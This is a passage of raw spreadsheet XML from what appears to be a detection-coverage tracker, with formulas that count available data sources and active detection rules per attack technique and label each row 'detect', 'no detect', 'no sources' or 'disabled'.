        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S40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04" t="s">
        <v>743</v>
      </c>
      <c r="U404" t="s">
        <v>1995</v>
      </c>
      <c r="V404" t="s">
        <v>1996</v>
      </c>
      <c r="W404" t="b">
        <v>1</v>
      </c>
      <c r="X404" t="s">
        <v>1963</v>
      </c>
    </row>
    <row r="405" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A405" t="s">
        <v>1963</v>
      </c>
      <c r="B405" t="s">
        <v>1997</v>
      </c>
      <c r="C405" t="s">
        <v>1998</v>
      </c>
      <c r="D405" t="s">
        <v>7</v>
      </c>
      <c r="E405" t="s">
        <v>549</v>
      </c>
      <c r="F405" s="9">
        <f t="shared" si="6"/>
        <v>1</v>
      </c>
      <c r="G405" s="9" cm="1">
        <f t="array" ref="G405">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H405" s="9" t="str" cm="1">
        <f t="array" ref="H405">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I405" s="9" t="str" cm="1">
        <f t="array" ref="I405">IF(SUM(IF($C405=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C405=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J405" s="9" t="str" cm="1">
        <f t="array" ref="J40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05" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M405" s="9" cm="1">
        <f t="array" ref="M405">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N405" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O405" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P405" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S40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05" t="s">
        <v>1402</v>
      </c>
      <c r="U405" t="s">
        <v>1999</v>
      </c>
      <c r="W405" t="b">
        <v>1</v>
      </c>
      <c r="X405" t="s">
        <v>1963</v>
      </c>
    </row>
    <row r="406" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A406" t="s">
        <v>2000</v>
      </c>
      <c r="B406" t="s">
        <v>2000</v>
      </c>
      <c r="C406" t="s">
        <v>209</v>
      </c>
      <c r="D406" t="s">
        <v>6</v>
      </c>
      <c r="E406" t="s">
        <v>2001</v>
      </c>
      <c r="F406" s="9">
        <f t="shared" si="6"/>
        <v>7</v>
      </c>
      <c r="G406" s="9" cm="1">
        <f t="array" ref="G406">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H406" s="9" cm="1">
        <f t="array" ref="H406">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>6</v>
      </c>
      <c r="I406" s="9" t="str" cm="1">
        <f t="array" ref="I406">IF(SUM(IF($C406=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C406=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J406" s="9" cm="1">
        <f t="array" ref="J40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406" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>6</v>
      </c>
      <c r="M406" s="9" cm="1">
        <f t="array" ref="M406">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>6</v>
      </c>
      <c r="N406" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O406" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P406" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S40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06" t="s">
        <v>368</v>
      </c>
      <c r="U406" t="s">
        <v>2002</v>
      </c>
      <c r="V406" t="s">
        <v>2003</v>
      </c>
      <c r="W406" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="407" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A407" t="s">
        <v>2000</v>
      </c>
      <c r="B407" t="s">
        <v>2004</v>
      </c>
      <c r="C407" t="s">
        <v>2005</v>
      </c>
      <c r="D407" t="s">
        <v>6</v>
      </c>
      <c r="E407" t="s">
        <v>2006</v>
      </c>
      <c r="F407" s="9">
        <f t="shared" si="6"/>
        <v>4</v>
      </c>
      <c r="G407" s="9" cm="1">
        <f t="array" ref="G407">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H407" s="9" t="str" cm="1">
        <f t="array" ref="H407">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I407" s="9" t="str" cm="1">
        <f t="array" ref="I407">IF(SUM(IF($C407=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C407=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J407" s="9" t="str" cm="1">
        <f t="array" ref="J40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07" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M407" s="9" cm="1">
        <f t="array" ref="M407">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N407" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O407" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P407" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S40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07" t="s">
        <v>658</v>
      </c>
      <c r="U407" t="s">
        <v>2007</v>
      </c>
      <c r="V407" t="s">
        <v>2008</v>
      </c>
      <c r="W407" t="b">
        <v>1</v>
      </c>
      <c r="X407" t="s">
        <v>2000</v>
      </c>
    </row>
    <row r="408" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A408" t="s">
        <v>2000</v>
      </c>
      <c r="B408" t="s">
        <v>2009</v>
      </c>
      <c r="C408" t="s">
        <v>335</v>
      </c>
      <c r="D408" t="s">
        <v>6</v>
      </c>
      <c r="E408" t="s">
        <v>531</v>
      </c>
      <c r="F408" s="9">
        <f t="shared" si="6"/>
        <v>1</v>
      </c>
      <c r="G408" s="9" cm="1">
        <f t="array" ref="G408">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H408" s="9" t="str" cm="1">
        <f t="array" ref="H408">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I408" s="9" t="str" cm="1">
        <f t="array" ref="I408">IF(SUM(IF($C408=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C408=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J408" s="9" t="str" cm="1">
        <f t="array" ref="J40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08" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M408" s="9" cm="1">
        <f t="array" ref="M408">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N408" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O408" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P408" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S40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08" t="s">
        <v>603</v>
      </c>
      <c r="U408" t="s">
        <v>2010</v>
      </c>
      <c r="V408" t="s">
        <v>2011</v>
      </c>
      <c r="W408" t="b">
        <v>1</v>
      </c>
      <c r="X408" t="s">
        <v>2000</v>
      </c>
    </row>
    <row r="409" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A409" t="s">
        <v>2000</v>
      </c>
      <c r="B409" t="s">
        <v>2012</v>
      </c>
      <c r="C409" t="s">
        <v>2013</v>
      </c>
      <c r="D409" t="s">
        <v>6</v>
      </c>
      <c r="E409" t="s">
        <v>2014</v>
      </c>
      <c r="F409" s="9">
        <f t="shared" si="6"/>
        <v>3</v>
      </c>
      <c r="G409" s="9" cm="1">
        <f t="array" ref="G409">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H409" s="9" t="str" cm="1">
        <f t="array" ref="H409">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I409" s="9" t="str" cm="1">
        <f t="array" ref="I409">IF(SUM(IF($C409=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C409=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J409" s="9" t="str" cm="1">
        <f t="array" ref="J40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09" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M409" s="9" cm="1">
        <f t="array" ref="M409">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N409" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O409" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P409" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S40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09" t="s">
        <v>386</v>
      </c>
      <c r="U409" t="s">
        <v>2015</v>
      </c>
      <c r="V409" t="s">
        <v>2016</v>
      </c>
      <c r="W409" t="b">
        <v>1</v>
      </c>
      <c r="X409" t="s">
        <v>2000</v>
      </c>
    </row>
    <row r="410" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A410" t="s">
        <v>2000</v>
      </c>
      <c r="B410" t="s">
        <v>2017</v>
      </c>
      <c r="C410" t="s">
        <v>2018</v>
      </c>
      <c r="D410" t="s">
        <v>6</v>
      </c>
      <c r="E410" t="s">
        <v>1904</v>
      </c>
      <c r="F410" s="9">
        <f t="shared" si="6"/>
        <v>4</v>
      </c>
      <c r="G410" s="9" cm="1">
        <f t="array" ref="G410">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H410" s="9" t="str" cm="1">
        <f t="array" ref="H410">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I410" s="9" t="str" cm="1">
        <f t="array" ref="I410">IF(SUM(IF($C410=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C410=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J410" s="9" t="str" cm="1">
        <f t="array" ref="J41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10" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M410" s="9" cm="1">
        <f t="array" ref="M410">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N410" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O410" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P410" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S41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10" t="s">
        <v>368</v>
      </c>
      <c r="U410" t="s">
        <v>2019</v>
      </c>
      <c r="V410" t="s">
        <v>2020</v>
      </c>
      <c r="W410" t="b">
        <v>1</v>
      </c>
      <c r="X410" t="s">
        <v>2000</v>
      </c>
    </row>
    <row r="411" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A411" t="s">
        <v>2000</v>
      </c>
      <c r="B411" t="s">
        <v>2021</v>
      </c>
      <c r="C411" t="s">
        <v>2022</v>
      </c>
      <c r="D411" t="s">
        <v>6</v>
      </c>
      <c r="E411" t="s">
        <v>566</v>
      </c>
      <c r="F411" s="9">
        <f t="shared" si="6"/>
        <v>2</v>
      </c>
      <c r="G411" s="9" cm="1">
        <f t="array" ref="G411">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H411" s="9" t="str" cm="1">
        <f t="array" ref="H411">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I411" s="9" t="str" cm="1">
        <f t="array" ref="I411">IF(SUM(IF($C411=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C411=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J411" s="9" t="str" cm="1">
        <f t="array" ref="J41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11" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M411" s="9" cm="1">
        <f t="array" ref="M411">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N411" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O411" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P411" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S41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11" t="s">
        <v>386</v>
      </c>
      <c r="U411" t="s">
        <v>2023</v>
      </c>
      <c r="V411" t="s">
        <v>2024</v>
      </c>
      <c r="W411" t="b">
        <v>1</v>
      </c>
      <c r="X411" t="s">
        <v>2000</v>
      </c>
    </row>
    <row r="412" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A412" t="s">
        <v>2000</v>
      </c>
      <c r="B412" t="s">
        <v>2025</v>
      </c>
      <c r="C412" t="s">
        <v>2026</v>
      </c>
      <c r="D412" t="s">
        <v>6</v>
      </c>
      <c r="E412" t="s">
        <v>1775</v>
      </c>
      <c r="F412" s="9">
        <f t="shared" si="6"/>
        <v>3</v>
      </c>
      <c r="G412" s="9" cm="1">
        <f t="array" ref="G412">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H412" s="9" t="str" cm="1">
        <f t="array" ref="H412">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I412" s="9" t="str" cm="1">
        <f t="array" ref="I412">IF(SUM(IF($C412=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C412=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J412" s="9" t="str" cm="1">
        <f t="array" ref="J41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12" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M412" s="9" cm="1">
        <f t="array" ref="M412">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N412" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O412" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P412" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S41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12" t="s">
        <v>603</v>
      </c>
      <c r="U412" t="s">
        <v>2027</v>
      </c>
      <c r="V412" t="s">
        <v>2028</v>
      </c>
      <c r="W412" t="b">
        <v>1</v>
      </c>
      <c r="X412" t="s">
        <v>2000</v>
      </c>
    </row>
    <row r="413" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A413" t="s">
        <v>2029</v>
      </c>
      <c r="B413" t="s">
        <v>2029</v>
      </c>
      <c r="C413" t="s">
        <v>80</v>
      </c>
      <c r="D413" t="s">
        <v>4</v>
      </c>
      <c r="E413" t="s">
        <v>2030</v>
      </c>
      <c r="F413" s="9">
        <f t="shared" si="6"/>
        <v>4</v>
      </c>
      <c r="G413" s="9" cm="1">
        <f t="array" ref="G413">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H413" s="9" cm="1">
        <f t="array" ref="H413">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I413" s="9" t="str" cm="1">
        <f t="array" ref="I413">IF(SUM(IF($C413=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C413=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J413" s="9" t="str" cm="1">
        <f t="array" ref="J41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13" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M413" s="9" cm="1">
        <f t="array" ref="M413">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N413" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O413" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P413" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S41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13" t="s">
        <v>368</v>
      </c>
      <c r="U413" t="s">
        <v>2031</v>
      </c>
      <c r="V413" t="s">
        <v>2032</v>
      </c>
      <c r="W413" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="414" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A414" t="s">
        <v>2033</v>
      </c>
      <c r="B414" t="s">
        <v>2033</v>
      </c>
      <c r="C414" t="s">
        <v>44</v>
      </c>
      <c r="D414" t="s">
        <v>7</v>
      </c>
      <c r="E414" t="s">
        <v>2034</v>
      </c>
      <c r="F414" s="9">
        <f t="shared" si="6"/>
        <v>6</v>
      </c>
      <c r="G414" s="9" cm="1">
        <f t="array" ref="G414">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
